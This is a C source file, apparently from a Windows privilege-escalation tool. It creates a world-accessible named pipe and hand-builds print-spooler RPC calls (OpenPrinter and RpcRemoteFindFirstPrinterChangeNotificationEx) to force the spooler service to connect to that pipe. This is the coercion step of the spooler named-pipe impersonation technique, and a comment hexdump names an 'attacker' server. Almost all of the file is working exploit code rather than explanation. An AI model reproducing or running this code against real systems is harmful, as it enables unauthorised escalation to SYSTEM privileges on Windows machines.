#include "Pipe.h"
#include "Rpc.h"
#include <sddl.h>
#include <stdio.h>
#include <windows.h>

#define MYSD "D:(A;OICI;GA;;;WD)"

#define RPCOPENPRINTER 1
#define RPCREMOTEFINDFIRSTPRINTERCHANGENOTIFICATIONEX 69
#define MAX_COMPUTERNAME_LENGTH_A 256
#define MAXIMUM_ALLOWED_ACCESS  0x02000000

typedef void *PRINTER_HANDLE;

typedef struct _DEVMODE_CONTAINER {
    DWORD cbBuf;
    BYTE* pDevMode;
} DEVMODE_CONTAINER;

typedef struct _RPC_V2_NOTIFY_OPTIONS_TYPE {
   unsigned short Type;
   unsigned short Reserved0;
   DWORD Reserved1;
   DWORD Reserved2;
   DWORD Count;
   unsigned short* pFields;
 } RPC_V2_NOTIFY_OPTIONS_TYPE;

typedef struct _RPC_V2_NOTIFY_OPTIONS {
   DWORD Version;
   DWORD Reserved;
   DWORD Count;
   RPC_V2_NOTIFY_OPTIONS_TYPE* pTypes;
 } RPC_V2_NOTIFY_OPTIONS;

HANDLE CreateSimplePipe(LPSTR pPipeName) {

    HANDLE hPipe;
    SECURITY_DESCRIPTOR SD = {0};
    SECURITY_ATTRIBUTES SA = {0};
    LPSTR pszPipeName = NULL;

    pszPipeName = malloc(MAX_PATH);
    sprintf_s(pszPipeName, MAX_PATH, "\\\\.\\pipe\\%s\\pipe\\spoolss", pPipeName);

    if (!InitializeSecurityDescriptor(&SD, SECURITY_DESCRIPTOR_REVISION))
        goto _end_of_function;
    if (!ConvertStringSecurityDescriptorToSecurityDescriptor(
            MYSD, SDDL_REVISION_1, &((&SA)->lpSecurityDescriptor), NULL))
        goto _end_of_function;
    if ((hPipe = CreateNamedPipe(pszPipeName, 
                    PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                    PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0,
                    &SA)) == NULL)
        goto _end_of_function;

    return hPipe;
_end_of_function:
    printf("[X] Error in create pipe: 0x%08x", GetLastError());
    return NULL;
}

HANDLE ConnectSimplePipe(HANDLE hPipe)
{
    HANDLE hPipeEvent = INVALID_HANDLE_VALUE;
    OVERLAPPED ol = { 0 };
    // Create a non-signaled event for the OVERLLAPED structure
    hPipeEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!hPipeEvent)
    {
        wprintf(L"CreateEvent() failed. Error: %d\n", GetLastError());
        return NULL;
    }

    ZeroMemory(&ol, sizeof(OVERLAPPED));
    ol.hEvent = hPipeEvent;

    // Connect the pipe asynchronously
    if (!ConnectNamedPipe(hPipe, &ol))
    {
        if (GetLastError() != ERROR_IO_PENDING){
        	wprintf(L"ConnectNamedPipe() failed. Error: %d\n", GetLastError());
        	return NULL;
        }
    }

    return hPipeEvent;
}
DWORD WINAPI TriggerSimplePipeConnection(LPSTR pPipeName) {

    HANDLE HR = NULL;
    BYTE bPrinterObject[20];
    LPWSTR pwszComputerName, pwszTargetServerPipeName = NULL; 
    LPWSTR pwszCaptureServerName = NULL;
    wchar_t *pwszCaptureServerPipeName = NULL;
    DWORD dwComputerNameLen = MAX_COMPUTERNAME_LENGTH + 1;
    DWORD dwCaptureServerPipeNameLen = 0x00;
    DWORD dwTargetServerPipeNameLen = 0x00;
    RpcConnectionStruct RpcConnection;
    DWORD dwReturnValue = 0x00;
    DWORD dwCaptureServerLen = 0x00;
    DEVMODE_CONTAINER DC = {0};
    RpcFunction rf = Default;


    pwszComputerName = malloc(dwComputerNameLen * sizeof(WCHAR));
    if (!GetComputerNameW(pwszComputerName, &dwComputerNameLen)){
        goto __end_of_function;
    }
    printf("[+++] Computer name: %ls\n", pwszComputerName);

    pwszTargetServerPipeName = malloc(MAX_PATH + 1);
    memset(pwszTargetServerPipeName, 0x00, MAX_PATH);
    swprintf_s(pwszTargetServerPipeName, MAX_PATH, L"\\\\%ls", pwszComputerName);
    dwTargetServerPipeNameLen = lstrlenW(pwszTargetServerPipeName) + 1;
    printf("[+++] Target Server pipe path: %ls\n", pwszTargetServerPipeName);
    printf("[+++] Target Server pipe path length: %d/%x\n", dwTargetServerPipeNameLen, dwTargetServerPipeNameLen);


    dwCaptureServerLen = MultiByteToWideChar(CP_ACP, 0, pPipeName, -1, NULL, 0);
    pwszCaptureServerName = malloc(dwCaptureServerLen * sizeof(WCHAR));
    MultiByteToWideChar(CP_ACP, 0, pPipeName, -1, 
            pwszCaptureServerName, dwCaptureServerLen);

    pwszCaptureServerPipeName = malloc(MAX_PATH + 1);
    memset(pwszCaptureServerPipeName, 0x00, MAX_PATH);
    swprintf_s(pwszCaptureServerPipeName, MAX_PATH, L"\\\\%ls/pipe/%ls",
            pwszComputerName, pwszCaptureServerName);
    dwCaptureServerPipeNameLen = lstrlenW(pwszCaptureServerPipeName) + 1;
    printf("[+++] Capture pipe path: %ls\n", pwszCaptureServerPipeName);
    printf("[+++] Capture pipe path length: %d/%x\n", dwCaptureServerPipeNameLen, dwCaptureServerPipeNameLen);

    /* ==================start of custom rpc client==============
     * ==========================================================*/

    if (RpcConnect("spoolss", "12345678-1234-ABCD-EF00-0123456789AB", 1,
                   &RpcConnection)){
        printf("[xxx] Failed to connect rpc\n");
        goto __end_of_function;
    }

    printf("[+++] Target computer unc path: %ls \n", pwszTargetServerPipeName);
    printf("[***] Open printer service...\n");

    /*
     *  The OpenPrinter DCERPC request buffer hexdump
     *
     *  0000   05 00 00 03 10 00 00 00 5c 00 00 00 0a 00 00 00
     *  0010   44 00 00 00 00 00 01 00 00 00 02 00 12 00 00 00
     *  0020   00 00 00 00 12 00 00 00 5c 00 5c 00 44 00 45 00
     *  0030   53 00 4b 00 54 00 4f 00 50 00 2d 00 43 00 39 00
     *  0040   41 00 4b 00 32 00 4b 00 43 00 00 00 00 00 00 00
     *  0050   00 00 00 00 00 00 00 00 00 00 00 00
     */

    RpcInitialiseRequestData(&RpcConnection);

    /* server options */
    PSERVEROPTIONS pServerOptions = NULL;
    pServerOptions = (PSERVEROPTIONS)malloc(sizeof(SERVEROPTIONS));
    memset(pServerOptions, 0x00, sizeof(SERVEROPTIONS));

    pServerOptions -> ReferentId = (DWORD)0x02000000;
    pServerOptions -> MaxCount = dwTargetServerPipeNameLen;
    pServerOptions -> Offset = 0;
    pServerOptions -> ActualCount = dwTargetServerPipeNameLen;

    RpcAppendRequestData_Binary(&RpcConnection, (BYTE*)pServerOptions,
                                                sizeof(SERVEROPTIONS));

    /* server pipe path */
    RpcAppendRequestData_Binary(&RpcConnection, (BYTE*)pwszTargetServerPipeName,
            dwTargetServerPipeNameLen * sizeof(WCHAR));

    /* some options */
    RpcAppendRequestData_Dword(&RpcConnection, 0x00);
    RpcAppendRequestData_Binary(&RpcConnection, (BYTE*)&DC, 
                                                sizeof(DEVMODE_CONTAINER));
    RpcAppendRequestData_Dword(&RpcConnection, MAXIMUM_ALLOWED_ACCESS);

    rf = EOpenPrinter;
    if (RpcSendRequest(&RpcConnection, 0x01, rf) != 0) {
        printf("[xxx] RpcSendRequest Error!\n");
        goto __end_of_function;
    }
    if (RpcConnection.dwProcedureOutputDataLength != 24) {
        printf("[xxx] The rpc return length is incorrect! : %d\n", 
                RpcConnection.dwProcedureOutputDataLength);
        goto __end_of_function;
    }


    /*
     *  The OpenPrinter DCERPC response buffer hexdump
     *
     *  0000   05 00 02 03 10 00 00 00 30 00 00 00 0a 00 00 00
     *  0010   18 00 00 00 00 00 00 00 00 00 00 00 29 f3 59 3a
     *  0020   ed c6 66 45 a0 2d ab d9 59 2b d8 e1 00 00 00 00
     */
    dwReturnValue = *(DWORD *)&RpcConnection.bProcedureOutputData[20];
    if (dwReturnValue != 0) {
        printf("OpenPrinter error: %u\n", dwReturnValue);
        goto __end_of_function;
    }

    /* store printer object */
    memcpy(bPrinterObject,
           (void *)&RpcConnection.bProcedureOutputData[0],
           sizeof(bPrinterObject));

    printf("[+++] Got printer object:\n\n");
    hexdump(bPrinterObject, 20);

    /*  lanuch RpcRemoteFindFirstPrinterChangeNotificationEx */

    /* 
     *  The RpcRemoteFindFirstPrinterChangeNotificationEx request body buffer 
     *
     *  0000   00 00 00 00 85 DC E4 44  1B C9 3C 4A 9B 73 70 50   .......D..<J.spP
     *  0010   5A 50 60 4E 00 00 00 00  00 00 00 00 41 41 41 41   ZP`N........AAAA
     *  0020   0B 00 00 00 00 00 00 00  0B 00 00 00 5C 00 5C 00   ............\.\.
     *  0030   61 00 74 00 74 00 61 00  63 00 6B 00 65 00 72 00   a.t.t.a.c.k.e.r.
     *  0040   00 00 00 00 7B 00 00 00  04 00 02 00 02 00 00 00   ....{...........
     *  0050   CE 55 00 00 02 00 00 00  08 00 02 00 02 00 00 00   .U..............
     *  0060   00 00 CE 55 00 00 00 00  00 00 00 00 01 00 00 00   ...U............
     *  0070   0C 00 02 00 01 00 00 00  E0 11 BD 8F CE 55 00 00   .............U..
     *  0080   01 00 00 00 10 00 02 00  01 00 00 00 00 00 00 00   ................
     *  0090   01 00 00 00 00 00  
     */

    RpcInitialiseRequestData(&RpcConnection);

    /* send the printer object */
    RpcAppendRequestData_Binary(&RpcConnection, (BYTE*)bPrinterObject, 20);

    /* send some options */
    RpcAppendRequestData_Dword(&RpcConnection, 0x00001000);
    RpcAppendRequestData_Dword(&RpcConnection, 0);

    /* send the server options buffer */
    memset(pServerOptions, 0x00, sizeof(SERVEROPTIONS));

    pServerOptions -> ReferentId = (DWORD)0x41414141;
    pServerOptions -> MaxCount = dwCaptureServerPipeNameLen;
    pServerOptions -> Offset = 0;
    pServerOptions -> ActualCount = dwCaptureServerPipeNameLen;

    RpcAppendRequestData_Binary(&RpcConnection, (BYTE*)pServerOptions,
                                                sizeof(SERVEROPTIONS));

    /* send the capture server pipe name */
    RpcAppendRequestData_Binary(&RpcConnection, (BYTE*)pwszCaptureServerPipeName, 
                                                (dwCaptureServerPipeNameLen) * sizeof(WCHAR));
    /* send some options */
    unsigned char OptionsBuffer[82] = {
         0x7B, 0x00, 0x00, 0x00, 0x04, 0x00, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00,
         0xCE, 0x55, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x08, 0x00, 0x02, 0x00,
         0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCE, 0x55, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x02, 0x00,
         0x01, 0x00, 0x00, 0x00, 0xE0, 0x11, 0xBD, 0x8F, 0xCE, 0x55, 0x00, 0x00,
         0x01, 0x00, 0x00, 0x00, 0x10, 0x00, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
    RpcAppendRequestData_Binary(&RpcConnection, (BYTE*)OptionsBuffer, sizeof(OptionsBuffer));

    rf = ERpcRemoteFindFirstPrinterChangeNotificationEx;
    if (RpcSendRequest(&RpcConnection, 0x41, rf) != 0) {
        printf("[xxx] RpcSendRequest Error!\n");
        goto __end_of_function;
    }
    if (RpcConnection.dwProcedureOutputDataLength != 24) {
        printf("[xxx] The rpc return length is incorrect! : %d\n", 
                RpcConnection.dwProcedureOutputDataLength);
        goto __end_of_function;
    }

    dwReturnValue = *(DWORD *)&RpcConnection.bProcedureOutputData[20];
    if (dwReturnValue != 0) {
        printf("OpenPrinter error: %u\n", dwReturnValue);
        goto __end_of_function;
    }

    printf("[+++] RpcRemoteFindFirstPrinterChangeNotificationEx successfully:\n\n");
    if (pwszComputerName) free(pwszComputerName);
    if (pwszTargetServerPipeName) free(pwszTargetServerPipeName);
    RpcDisconnect(&RpcConnection);

    /* ==================end of custom rpc client==============
     * ========================================================*/

    return 1;

__end_of_function:
    printf("[X] Error in trigger client connect: 0x%08x\n", GetLastError());
    if (pwszComputerName) free(pwszComputerName);
    if (pwszTargetServerPipeName) free(pwszTargetServerPipeName);
    RpcDisconnect(&RpcConnection);
    return 0;
}
